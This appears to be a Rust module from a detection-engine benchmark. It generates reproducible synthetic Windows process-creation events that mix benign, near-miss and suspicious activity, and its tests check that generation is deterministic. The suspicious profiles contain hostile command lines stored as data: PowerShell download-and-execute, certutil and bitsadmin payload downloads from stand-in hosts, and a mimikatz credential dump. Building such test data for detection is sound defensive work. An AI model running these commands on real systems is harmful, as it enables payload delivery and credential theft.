//! Deterministic event generator.
//!
//! Produces a reproducible stream of Windows `process_creation` events from a
//! fixed seed: a controlled mix of benign noise, near-miss, and genuinely
//! suspicious events. Every engine consumes the exact same events (rendered
//! once), so no engine sees a different workload.

use serde_json::{json, Map, Value};

/// Fraction weights out of 100: benign / near-miss / suspicious.
const BENIGN_CUTOFF: u64 = 70;
const NEAR_MISS_CUTOFF: u64 = 90;

/// SplitMix64 — tiny, seedable, deterministic PRNG. No external dependency,
/// identical output on every platform.
pub struct SplitMix64(u64);

impl SplitMix64 {
    pub fn new(seed: u64) -> Self {
        Self(seed)
    }

    pub fn next(&mut self) -> u64 {
        self.0 = self.0.wrapping_add(0x9E37_79B9_7F4A_7C15);
        let mut z = self.0;
        z = (z ^ (z >> 30)).wrapping_mul(0xBF58_476D_1CE4_E5B9);
        z = (z ^ (z >> 27)).wrapping_mul(0x94D0_49BB_1331_11EB);
        z ^ (z >> 31)
    }

    fn pick<'a, T>(&mut self, items: &'a [T]) -> &'a T {
        &items[(self.next() % items.len() as u64) as usize]
    }
}

struct Profile {
    image: &'static str,
    original: &'static str,
    description: &'static str,
    company: &'static str,
    parent: &'static str,
    parent_cmd: &'static str,
    cmdlines: &'static [&'static str],
}

const BENIGN: &[Profile] = &[
    Profile {
        image: r"C:\Program Files\Google\Chrome\Application\chrome.exe",
        original: "chrome.exe",
        description: "Google Chrome",
        company: "Google LLC",
        parent: r"C:\Windows\explorer.exe",
        parent_cmd: r"C:\Windows\Explorer.EXE",
        cmdlines: &[
            r#""C:\Program Files\Google\Chrome\Application\chrome.exe" --type=renderer"#,
            r#""C:\Program Files\Google\Chrome\Application\chrome.exe" --type=gpu-process"#,
        ],
    },
    Profile {
        image: r"C:\Windows\System32\svchost.exe",
        original: "svchost.exe",
        description: "Host Process for Windows Services",
        company: "Microsoft Corporation",
        parent: r"C:\Windows\System32\services.exe",
        parent_cmd: r"C:\Windows\system32\services.exe",
        cmdlines: &[
            r"C:\Windows\system32\svchost.exe -k netsvcs -p -s Schedule",
            r"C:\Windows\system32\svchost.exe -k LocalServiceNetworkRestricted -p",
        ],
    },
    Profile {
        image: r"C:\Windows\System32\notepad.exe",
        original: "NOTEPAD.EXE",
        description: "Notepad",
        company: "Microsoft Corporation",
        parent: r"C:\Windows\explorer.exe",
        parent_cmd: r"C:\Windows\Explorer.EXE",
        cmdlines: &[
            r#""C:\Windows\system32\notepad.exe" C:\Users\alice\notes.txt"#,
            r"C:\Windows\system32\notepad.exe",
        ],
    },
    Profile {
        image: r"C:\Program Files\Microsoft Office\root\Office16\WINWORD.EXE",
        original: "WinWord.exe",
        description: "Microsoft Word",
        company: "Microsoft Corporation",
        parent: r"C:\Windows\explorer.exe",
        parent_cmd: r"C:\Windows\Explorer.EXE",
        cmdlines: &[r#""C:\Program Files\Microsoft Office\root\Office16\WINWORD.EXE" /n "C:\Users\alice\report.docx""#],
    },
    Profile {
        image: r"C:\Windows\System32\conhost.exe",
        original: "CONHOST.EXE",
        description: "Console Window Host",
        company: "Microsoft Corporation",
        parent: r"C:\Windows\System32\cmd.exe",
        parent_cmd: r#""C:\Windows\system32\cmd.exe""#,
        cmdlines: &[r"\??\C:\Windows\system32\conhost.exe 0xffffffff -ForceV1"],
    },
];

const NEAR_MISS: &[Profile] = &[
    // PowerShell doing ordinary admin work — exercises the many PowerShell
    // rules' prefilters without (usually) matching them.
    Profile {
        image: r"C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe",
        original: "PowerShell.EXE",
        description: "Windows PowerShell",
        company: "Microsoft Corporation",
        parent: r"C:\Windows\explorer.exe",
        parent_cmd: r"C:\Windows\Explorer.EXE",
        cmdlines: &[
            r"powershell.exe -ExecutionPolicy RemoteSigned -File C:\Scripts\backup.ps1",
            r"powershell.exe Get-Process | Sort-Object CPU",
            r"powershell.exe -NoProfile -Command Get-ChildItem C:\Logs",
        ],
    },
    Profile {
        image: r"C:\Windows\System32\reg.exe",
        original: "reg.exe",
        description: "Registry Console Tool",
        company: "Microsoft Corporation",
        parent: r"C:\Windows\System32\cmd.exe",
        parent_cmd: r#""C:\Windows\system32\cmd.exe" /c setup.bat"#,
        cmdlines: &[r#"reg query "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion""#],
    },
    Profile {
        image: r"C:\Windows\System32\rundll32.exe",
        original: "RUNDLL32.EXE",
        description: "Windows host process (Rundll32)",
        company: "Microsoft Corporation",
        parent: r"C:\Windows\System32\svchost.exe",
        parent_cmd: r"C:\Windows\system32\svchost.exe -k netsvcs -p",
        cmdlines: &[r"rundll32.exe Shell32.dll,Control_RunDLL desk.cpl"],
    },
];

const SUSPICIOUS: &[Profile] = &[
    Profile {
        image: r"C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe",
        original: "PowerShell.EXE",
        description: "Windows PowerShell",
        company: "Microsoft Corporation",
        parent: r"C:\Users\alice\AppData\Local\Temp\dropper.exe",
        parent_cmd: r"C:\Users\alice\AppData\Local\Temp\dropper.exe",
        cmdlines: &[
            r"powershell.exe -nop -w hidden -EncodedCommand SQBFAFgAIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQA",
            r"powershell.exe -exec bypass -c IEX (New-Object Net.WebClient).DownloadString('http://10.1.2.3/a.ps1')",
        ],
    },
    Profile {
        image: r"C:\Windows\System32\certutil.exe",
        original: "CertUtil.exe",
        description: "CertUtil.exe",
        company: "Microsoft Corporation",
        parent: r"C:\Windows\System32\cmd.exe",
        parent_cmd: r#"cmd.exe /c update.bat"#,
        cmdlines: &[
            r"certutil.exe -urlcache -split -f http://evil.example.com/payload.exe C:\Users\Public\payload.exe",
            r"certutil -decode C:\Users\Public\enc.txt C:\Users\Public\dec.exe",
        ],
    },
    Profile {
        image: r"C:\Windows\System32\whoami.exe",
        original: "whoami.exe",
        description: "whoami - displays logged on user information",
        company: "Microsoft Corporation",
        parent: r"C:\Windows\System32\cmd.exe",
        parent_cmd: r#""C:\Windows\system32\cmd.exe""#,
        cmdlines: &[r"whoami /priv", r"whoami /all"],
    },
    Profile {
        image: r"C:\Users\Public\mimikatz.exe",
        original: "mimikatz.exe",
        description: "mimikatz for Windows",
        company: "gentilkiwi (Benjamin DELPY)",
        parent: r"C:\Windows\System32\cmd.exe",
        parent_cmd: r#""C:\Windows\system32\cmd.exe""#,
        cmdlines: &[r#"mimikatz.exe "privilege::debug" "sekurlsa::logonpasswords" exit"#],
    },
    Profile {
        image: r"C:\Windows\System32\bitsadmin.exe",
        original: "bitsadmin.exe",
        description: "BITS administration utility",
        company: "Microsoft Corporation",
        parent: r"C:\Windows\System32\cmd.exe",
        parent_cmd: r"cmd /c job.bat",
        cmdlines: &[
            r"bitsadmin /transfer defaultjob /download http://malicious.example.com/x.exe C:\Users\Public\x.exe",
        ],
    },
];

const USERS: &[&str] = &["CORP\\alice", "CORP\\bob", "NT AUTHORITY\\SYSTEM", "CORP\\svc-deploy"];
const INTEGRITY: &[&str] = &["Medium", "High", "System"];

fn build_event(rng: &mut SplitMix64, n: u64) -> Map<String, Value> {
    let roll = rng.next() % 100;
    let profile = if roll < BENIGN_CUTOFF {
        rng.pick(BENIGN)
    } else if roll < NEAR_MISS_CUTOFF {
        rng.pick(NEAR_MISS)
    } else {
        rng.pick(SUSPICIOUS)
    };
    let cmd = rng.pick(profile.cmdlines);
    let pid = 1000 + (rng.next() % 60000);
    let ppid = 400 + (rng.next() % 4000);

    let mut m = Map::new();
    // Logsource routing fields (null-sigma uses these; extra fields are
    // harmless to the other engines).
    m.insert("category".into(), json!("process_creation"));
    m.insert("product".into(), json!("windows"));
    m.insert("EventID".into(), json!("1"));
    m.insert("Image".into(), json!(profile.image));
    m.insert("OriginalFileName".into(), json!(profile.original));
    m.insert("Description".into(), json!(profile.description));
    m.insert("Company".into(), json!(profile.company));
    m.insert("CommandLine".into(), json!(cmd));
    m.insert("ParentImage".into(), json!(profile.parent));
    m.insert("ParentCommandLine".into(), json!(profile.parent_cmd));
    m.insert("User".into(), json!(*rng.pick(USERS)));
    m.insert("IntegrityLevel".into(), json!(*rng.pick(INTEGRITY)));
    m.insert("CurrentDirectory".into(), json!(r"C:\Windows\system32\"));
    m.insert("ProcessId".into(), json!(pid.to_string()));
    m.insert("ParentProcessId".into(), json!(ppid.to_string()));
    m.insert("LogonId".into(), json!(format!("0x{:x}", 0x3E7 + (n % 5))));
    m.insert(
        "Hashes".into(),
        json!(format!(
            "MD5={:032X},SHA256={:064X}",
            rng.next() as u128,
            rng.next() as u128
        )),
    );
    m
}

/// Generate `count` deterministic flat process-creation events.
pub fn generate(seed: u64, count: usize) -> Vec<Map<String, Value>> {
    let mut rng = SplitMix64::new(seed);
    (0..count).map(|n| build_event(&mut rng, n as u64)).collect()
}

/// Basis points out of 10_000 for A4 controlled event-hit rate.
/// Event `i` is a hit iff `(i % 10_000) < hit_bpm` (clamped to ≤ 10_000).
pub fn a4_is_hit(index: u64, hit_bpm: u32) -> bool {
    let bpm = hit_bpm.min(10_000);
    (index % 10_000) < u64::from(bpm)
}

/// Expected hit count for `count` events at `hit_bpm` (exact under the index rule).
pub fn a4_expected_hits(count: usize, hit_bpm: u32) -> u64 {
    let bpm = u64::from(hit_bpm.min(10_000));
    let full = (count as u64) / 10_000;
    let rem = (count as u64) % 10_000;
    full * bpm + rem.min(bpm)
}

/// A4 firehose fixtures: same process-creation shape as [`generate`], plus
/// deterministic `A4Hit` = `"1"` / `"0"` so a single-rule pack yields
/// multiplicity \(m \approx 1\) and event-hit rate \(p = hit_bpm / 10_000\).
pub fn generate_a4(seed: u64, count: usize, hit_bpm: u32) -> Vec<Map<String, Value>> {
    let mut events = generate(seed, count);
    for (i, e) in events.iter_mut().enumerate() {
        let flag = if a4_is_hit(i as u64, hit_bpm) {
            "1"
        } else {
            "0"
        };
        e.insert("A4Hit".into(), json!(flag));
    }
    events
}

/// Render a flat event in the JSONL shape Hayabusa's `-J` input expects.
///
/// Hayabusa wraps every JSONL line as `{"Event":{"EventData": <line>}}`
/// itself (`read_jsonl_to_value` in hayabusa's utils.rs) and resolves
/// `Channel`/`EventID` through its eventkey aliases — so records must be
/// FLAT, nxlog-style (see hayabusa's own `test_files/evtx/test.jsonl`),
/// with event data fields, `Channel`, and `EventID` all at the top level.
pub fn to_evtx_json(flat: &Map<String, Value>, record_id: u64) -> Value {
    let mut rec = Map::new();
    for (k, v) in flat {
        if k == "category" || k == "product" || k == "EventID" {
            continue;
        }
        rec.insert(k.clone(), v.clone());
    }
    rec.insert("Channel".into(), json!("Microsoft-Windows-Sysmon/Operational"));
    rec.insert("EventID".into(), json!(1));
    rec.insert("SourceName".into(), json!("Microsoft-Windows-Sysmon"));
    rec.insert("Provider".into(), json!("Microsoft-Windows-Sysmon"));
    rec.insert("ProviderGuid".into(), json!("{5770385F-C22A-43E0-BF4C-06F5698FFBD9}"));
    rec.insert("Hostname".into(), json!("WKSTN-01.corp.local"));
    rec.insert("Computer".into(), json!("WKSTN-01.corp.local"));
    rec.insert("UtcTime".into(), json!("2026-07-04 12:00:00.000"));
    rec.insert("EventTime".into(), json!("2026-07-04 12:00:00"));
    rec.insert("@timestamp".into(), json!("2026-07-04T12:00:00.000Z"));
    rec.insert("RecordNumber".into(), json!(record_id));
    rec.insert("Keywords".into(), json!(-9_223_372_036_854_775_808_i64));
    rec.insert("Task".into(), json!(1));
    rec.insert("Version".into(), json!(5));
    rec.insert("OpcodeValue".into(), json!(0));
    rec.insert("Severity".into(), json!("INFO"));
    rec.insert("UserID".into(), json!("S-1-5-18"));
    Value::Object(rec)
}

#[cfg(test)]
mod tests {
    use super::*;

    #[test]
    fn generation_is_deterministic() {
        let a = generate(42, 500);
        let b = generate(42, 500);
        assert_eq!(a, b);
        let c = generate(43, 500);
        assert_ne!(a, c);
    }

    #[test]
    fn mix_contains_all_three_classes() {
        let events = generate(42, 2000);
        let suspicious = events
            .iter()
            .filter(|e| e["CommandLine"].as_str().unwrap().contains("-EncodedCommand"))
            .count();
        let benign = events
            .iter()
            .filter(|e| e["Image"].as_str().unwrap().ends_with("chrome.exe"))
            .count();
        assert!(suspicious > 0, "no suspicious events generated");
        assert!(benign > 0, "no benign events generated");
    }

    #[test]
    fn a4_hit_count_is_exact_and_deterministic() {
        for bpm in [100u32, 1000, 5000] {
            let a = generate_a4(42, 10_000, bpm);
            let b = generate_a4(42, 10_000, bpm);
            assert_eq!(a, b);
            let hits = a
                .iter()
                .filter(|e| e["A4Hit"].as_str() == Some("1"))
                .count() as u64;
            assert_eq!(hits, a4_expected_hits(10_000, bpm));
            assert_eq!(hits, u64::from(bpm));
        }
        // Non-multiple of 10_000: rem.min(bpm) exactness.
        let hits = generate_a4(7, 12_345, 1000)
            .iter()
            .filter(|e| e["A4Hit"].as_str() == Some("1"))
            .count() as u64;
        assert_eq!(hits, a4_expected_hits(12_345, 1000));
        assert_eq!(hits, 1000 + 1000); // 1 full cycle + min(2345, 1000)
    }
}
